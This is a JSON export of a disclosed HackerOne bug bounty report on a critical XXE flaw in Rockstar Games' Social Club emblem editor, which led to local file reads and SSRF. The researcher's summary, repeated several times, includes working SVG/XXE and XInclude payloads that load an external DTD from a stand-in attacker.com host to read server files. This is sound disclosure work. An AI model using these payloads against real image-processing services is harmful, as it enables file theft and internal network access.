@@ -1,0 +1,588 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-07-31T14:57:27.932Z", 
+    "voters": [
+        "mvc", 
+        "sp1d3rs", 
+        "michiel", 
+        "z3t", 
+        "spam404", 
+        "europa", 
+        "ramsexy", 
+        "s_p_q_r", 
+        "yox", 
+        "0x61_", 
+        "and 37 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "1500.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 347139, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-08-01T15:46:11.094Z", 
+    "vulnerability_information": "", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "critical", 
+        "author_type": "User"
+    }, 
+    "title": "LFI and SSRF via XXE in emblem editor", 
+    "is_member_of_team?": null, 
+    "vote_count": 47, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 9682, 
+            "content": "This summary is provided by the researcher who submitted this report, @alexbirsan . \n\n___________________________________________________________________________________________________________________________\n\nAbout one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.\n\nFor those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:\n\n1. Double forward slash to reference an SMB path:\n\n    ```xml\n    <rect fill=\u201curl(//attacker.com/malicious.svg#exploit)\u201d>\n    ```\n    This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.\n\n2. Classic XXE:\n\n    ```xml\n<!DOCTYPE svg [\n<!ENTITY % outside SYSTEM \"http://attacker.com/exfil.dtd\">\n%outside;\n]>\n<svg>\n  <defs>\n    <pattern id=\"exploit\">\n      <text x=\"10\" y=\"10\">\n        &exfil;\n      </text>\n    </pattern>\n  </defs>\n</svg>\n```\n    **exfil.dtd**\n\n    ```xml\n<!ENTITY % data SYSTEM \"file:///C:/Windows/system32/drivers/etc/hosts\">\n<!ENTITY exfil \"%data;\">\n```\n    This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`).\n\n3. Bonus method - XIncludes\n\n    ```xml\n<text x=\"10\" y=\"10\">\n    <xi:include href=\"https://www.google.com/\" parse=\"text\"/>\n</text>\n```\nIt turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it's a bit more reliable and straight-forward.\n\nThe final POC looked like this:\n{F293137}", 
+            "content_html": "<p>This summary is provided by the researcher who submitted this report, <a href=\"/alexbirsan\">@alexbirsan</a> . </p>\n\n<hr>\n\n<p>About one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.</p>\n\n<p>For those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:</p>\n\n<ol>\n<li>\n<p>Double forward slash to reference an SMB path:</p>\n<pre class=\"highlight xml\"><code><span class=\"nt\">&lt;rect</span> <span class=\"na\">fill=</span><span class=\"s\">\u201curl(//attacker.com/malicious.svg#exploit)\u201d</span><span class=\"nt\">&gt;</span>\n</code></pre>\n<p>This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.</p>\n</li>\n<li>\n<p>Classic XXE:</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;!DOCTYPE svg [\n&lt;!ENTITY % outside SYSTEM &quot;http://attacker.com/exfil.dtd&quot;&gt;</span>\n%outside;\n]&gt;\n<span class=\"nt\">&lt;svg&gt;</span>\n<span class=\"nt\">&lt;defs&gt;</span>\n<span class=\"nt\">&lt;pattern</span> <span class=\"na\">id=</span><span class=\"s\">&quot;exploit&quot;</span><span class=\"nt\">&gt;</span>\n  <span class=\"nt\">&lt;text</span> <span class=\"na\">x=</span><span class=\"s\">&quot;10&quot;</span> <span class=\"na\">y=</span><span class=\"s\">&quot;10&quot;</span><span class=\"nt\">&gt;</span>\n    <span class=\"ni\">&amp;exfil;</span>\n  <span class=\"nt\">&lt;/text&gt;</span>\n<span class=\"nt\">&lt;/pattern&gt;</span>\n<span class=\"nt\">&lt;/defs&gt;</span>\n<span class=\"nt\">&lt;/svg&gt;</span>\n</code></pre>\n<p><strong>exfil.dtd</strong></p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;!ENTITY % data SYSTEM &quot;file:///C:/Windows/system32/drivers/etc/hosts&quot;&gt;</span>\n<span class=\"cp\">&lt;!ENTITY exfil &quot;%data;&quot;&gt;</span>\n</code></pre>\n<p>This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using <code>//</code>).</p>\n</li>\n<li>\n<p>Bonus method - XIncludes</p>\n<pre class=\"highlight xml\"><code><span class=\"nt\">&lt;text</span> <span class=\"na\">x=</span><span class=\"s\">&quot;10&quot;</span> <span class=\"na\">y=</span><span class=\"s\">&quot;10&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;xi:include</span> <span class=\"na\">href=</span><span class=\"s\">&quot;https://www.google.com/&quot;</span> <span class=\"na\">parse=</span><span class=\"s\">&quot;text&quot;</span><span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;/text&gt;</span>\n</code></pre>\n<p>It turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it&#39;s a bit more reliable and straight-forward.</p>\n</li>\n</ol>\n\n<p>The final POC looked like this:<br>\n{F293137}</p>\n"
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 9679, 
+            "content": "About one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.\n\nFor those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:\n\n1. Double forward slash to reference an SMB path:\n\n    ```xml\n    <rect fill=\u201curl(//attacker.com/malicious.svg#exploit)\u201d>\n    ```\n    This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.\n\n2. Classic XXE:\n\n    ```xml\n    <!DOCTYPE svg [\n    <!ENTITY % outside SYSTEM \"http://attacker.com/exfil.dtd\">\n    %outside;\n    ]>\n    <svg>\n      <defs>\n        <pattern id=\"exploit\">\n          <text x=\"10\" y=\"10\">\n            &exfil;\n          </text>\n        </pattern>\n      </defs>\n    </svg>\n    ```\n    \n    **exfil.dtd**\n    ```xml\n    <!ENTITY % data SYSTEM \"file:///C:/Windows/system32/drivers/etc/hosts\">\n    <!ENTITY exfil \"%data;\">\n    ```\n\n    This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`).\n\n3. Bonus method - XIncludes\n   \n    ```xml\n    <text x=\"10\" y=\"10\">\n        <xi:include href=\"https://www.google.com/\" parse=\"text\"/>\n    </text>\n    ```\n    \n    It turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it's a bit more reliable and straight-forward.\n\nThe final POC looked like this:\n{F293137}", 
+            "content_html": "<p>About one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.</p>\n\n<p>For those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:</p>\n\n<ol>\n<li>\n<p>Double forward slash to reference an SMB path:</p>\n<pre class=\"highlight xml\"><code><span class=\"nt\">&lt;rect</span> <span class=\"na\">fill=</span><span class=\"s\">\u201curl(//attacker.com/malicious.svg#exploit)\u201d</span><span class=\"nt\">&gt;</span>\n</code></pre>\n<p>This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.</p>\n</li>\n<li>\n<p>Classic XXE:</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;!DOCTYPE svg [\n&lt;!ENTITY % outside SYSTEM &quot;http://attacker.com/exfil.dtd&quot;&gt;</span>\n%outside;\n]&gt;\n<span class=\"nt\">&lt;svg&gt;</span>\n  <span class=\"nt\">&lt;defs&gt;</span>\n    <span class=\"nt\">&lt;pattern</span> <span class=\"na\">id=</span><span class=\"s\">&quot;exploit&quot;</span><span class=\"nt\">&gt;</span>\n      <span class=\"nt\">&lt;text</span> <span class=\"na\">x=</span><span class=\"s\">&quot;10&quot;</span> <span class=\"na\">y=</span><span class=\"s\">&quot;10&quot;</span><span class=\"nt\">&gt;</span>\n        <span class=\"ni\">&amp;exfil;</span>\n      <span class=\"nt\">&lt;/text&gt;</span>\n    <span class=\"nt\">&lt;/pattern&gt;</span>\n  <span class=\"nt\">&lt;/defs&gt;</span>\n<span class=\"nt\">&lt;/svg&gt;</span>\n</code></pre>\n<p><strong>exfil.dtd</strong></p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;!ENTITY % data SYSTEM &quot;file:///C:/Windows/system32/drivers/etc/hosts&quot;&gt;</span>\n<span class=\"cp\">&lt;!ENTITY exfil &quot;%data;&quot;&gt;</span>\n</code></pre>\n<p>This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using <code>//</code>).</p>\n</li>\n<li>\n<p>Bonus method - XIncludes</p>\n<pre class=\"highlight xml\"><code><span class=\"nt\">&lt;text</span> <span class=\"na\">x=</span><span class=\"s\">&quot;10&quot;</span> <span class=\"na\">y=</span><span class=\"s\">&quot;10&quot;</span><span class=\"nt\">&gt;</span>\n    <span class=\"nt\">&lt;xi:include</span> <span class=\"na\">href=</span><span class=\"s\">&quot;https://www.google.com/&quot;</span> <span class=\"na\">parse=</span><span class=\"s\">&quot;text&quot;</span><span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;/text&gt;</span>\n</code></pre>\n<p>It turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it&#39;s a bit more reliable and straight-forward.</p>\n</li>\n</ol>\n\n<p>The final POC looked like this:<br>\n{F293137}</p>\n"
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "socialclub.rockstargames.com", 
+        "max_severity": "critical", 
+        "databaseId": 430, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": "2018-08-30T14:57:28.136Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$1,500", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-03T14:13:10.974Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-03T14:16:37.169Z", 
+            "actor": {
+                "username": "alexbirsan", 
+                "url": "/alexbirsan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/076/545/7981643a7a9cff81850905b9aef2ee2c7b46571c_medium.jpg?1495635073"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2696630, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-03T16:15:47.779Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-03T16:15:47.779Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2696949, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-03T18:16:55.476Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-03T18:16:55.476Z", 
+            "actor": {
+                "username": "alexbirsan", 
+                "url": "/alexbirsan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/076/545/7981643a7a9cff81850905b9aef2ee2c7b46571c_medium.jpg?1495635073"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2697392, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-04T00:54:45.936Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-04T00:54:45.936Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2698245, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-04T11:10:13.933Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-04T11:12:47.829Z", 
+            "actor": {
+                "username": "alexbirsan", 
+                "url": "/alexbirsan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/076/545/7981643a7a9cff81850905b9aef2ee2c7b46571c_medium.jpg?1495635073"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2700014, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-04T14:21:57.018Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-04T14:21:57.018Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2700422, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-01T22:16:28.033Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-01T22:16:28.033Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2831148, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-02T13:53:27.684Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-02T13:53:27.684Z", 
+            "actor": {
+                "username": "alexbirsan", 
+                "url": "/alexbirsan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/076/545/7981643a7a9cff81850905b9aef2ee2c7b46571c_medium.jpg?1495635073"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2833147, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-06-04T13:43:27.954Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-04T13:43:27.954Z", 
+            "actor": {
+                "url": "/rockstargames", 
+                "profile": {
+                    "name": "Rockstar Games"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/143/3f252d109e077cdd40613ce40116fed34b20ccc8_medium.png?1433294886"
+                }
+            }, 
+            "team_handle": "rockstargames", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "1500.0", 
+            "collaborator": {
+                "username": "alexbirsan", 
+                "url": "/alexbirsan"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2839137, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "alexbirsan", 
+                "url": "/alexbirsan"
+            }, 
+            "created_at": "2018-06-04T13:43:35.925Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-04T13:43:35.925Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2839138, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-04T14:00:19.300Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-04T14:00:19.300Z", 
+            "actor": {
+                "username": "alexbirsan", 
+                "url": "/alexbirsan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/076/545/7981643a7a9cff81850905b9aef2ee2c7b46571c_medium.jpg?1495635073"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2839177, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-11T11:51:20.018Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-11T11:51:20.018Z", 
+            "actor": {
+                "username": "alexbirsan", 
+                "url": "/alexbirsan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/076/545/7981643a7a9cff81850905b9aef2ee2c7b46571c_medium.jpg?1495635073"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 3030366, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-31T03:12:31.113Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-31T03:12:31.113Z", 
+            "actor": {
+                "username": "alexbirsan", 
+                "url": "/alexbirsan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/076/545/7981643a7a9cff81850905b9aef2ee2c7b46571c_medium.jpg?1495635073"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 3119082, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-31T13:37:36.876Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-31T13:37:36.876Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 3122264, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-31T14:57:27.980Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-31T15:07:52.423Z", 
+            "actor": {
+                "username": "alexbirsan", 
+                "url": "/alexbirsan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/076/545/7981643a7a9cff81850905b9aef2ee2c7b46571c_medium.jpg?1495635073"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3122567, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-31T15:08:28.141Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-31T15:08:28.141Z", 
+            "actor": {
+                "username": "thefrog", 
+                "url": "/thefrog", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/246/015/804f36c18801d3924ed6e7f6dc7efb8d966f053e_medium.jpg?1529682394"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 3122608, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-01T15:13:55.873Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-01T15:13:55.873Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 3128998, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-01T15:23:00.246Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-01T15:23:00.246Z", 
+            "actor": {
+                "username": "alexbirsan", 
+                "url": "/alexbirsan", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/076/545/7981643a7a9cff81850905b9aef2ee2c7b46571c_medium.jpg?1495635073"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 3129034, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-01T15:46:11.173Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-01T15:46:11.173Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 3129226, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-01T15:46:11.511Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-01T15:46:11.511Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3129227, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "alexbirsan", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/alexbirsan", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/076/545/6c3af2ed6629a95c74f75f8612ce1fc7b60f6900_small.jpg?1495635073"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 54, 
+        "name": "XML External Entities (XXE)"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "no-content", 
+    "allow_singular_disclosure_after": -8493658.1874206, 
+    "disclosed_at": "2018-08-01T15:46:11.439Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/347139", 
+    "created_at": "2018-05-03T12:06:53.004Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://www.rockstargames.com/", 
+            "about": "Publishers of such popular games as Grand Theft Auto, Max Payne, Red Dead Redemption, L.A. Noire, Bully & more.", 
+            "twitter_handle": "RockstarGames", 
+            "name": "Rockstar Games"
+        }, 
+        "handle": "rockstargames", 
+        "url": "https://hackerone.com/rockstargames", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/002/143/9593462347d0af4f1a75c67ee0e2b0807b34e4a3_small.png?1433294886", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/002/143/3f252d109e077cdd40613ce40116fed34b20ccc8_medium.png?1433294886"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 2143, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
